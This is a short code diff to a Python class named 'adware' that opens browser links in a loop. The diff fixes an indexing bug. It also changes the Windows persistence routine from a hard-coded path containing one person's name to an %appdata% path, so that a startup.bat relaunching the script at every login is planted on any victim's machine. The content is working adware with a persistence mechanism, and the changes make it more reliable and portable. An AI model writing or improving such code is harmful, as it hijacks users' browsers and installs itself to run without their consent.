@@ -26,7 +26,7 @@ class adware:
     def openLink(self):
         webbrowser.open(self.links[self.i])
         self.i += 1
-        if self.i > len(self.links):
+        if self.i > len(self.links) - 1:
             self.i = 0
 
     def wait(self):
@@ -51,7 +51,7 @@ class adware:
 
     def persistenceWindows(self):
         #make bat
-        bat = open("C:/Users/Jacob Krumholz/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.bat", 'w+')
+        bat = open(os.path.expandvars("%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/startup.bat"), 'w+')
         #write to plist
         bat.write(self.pyCall + ' \"' + __file__ + "\"")
         bat.close();
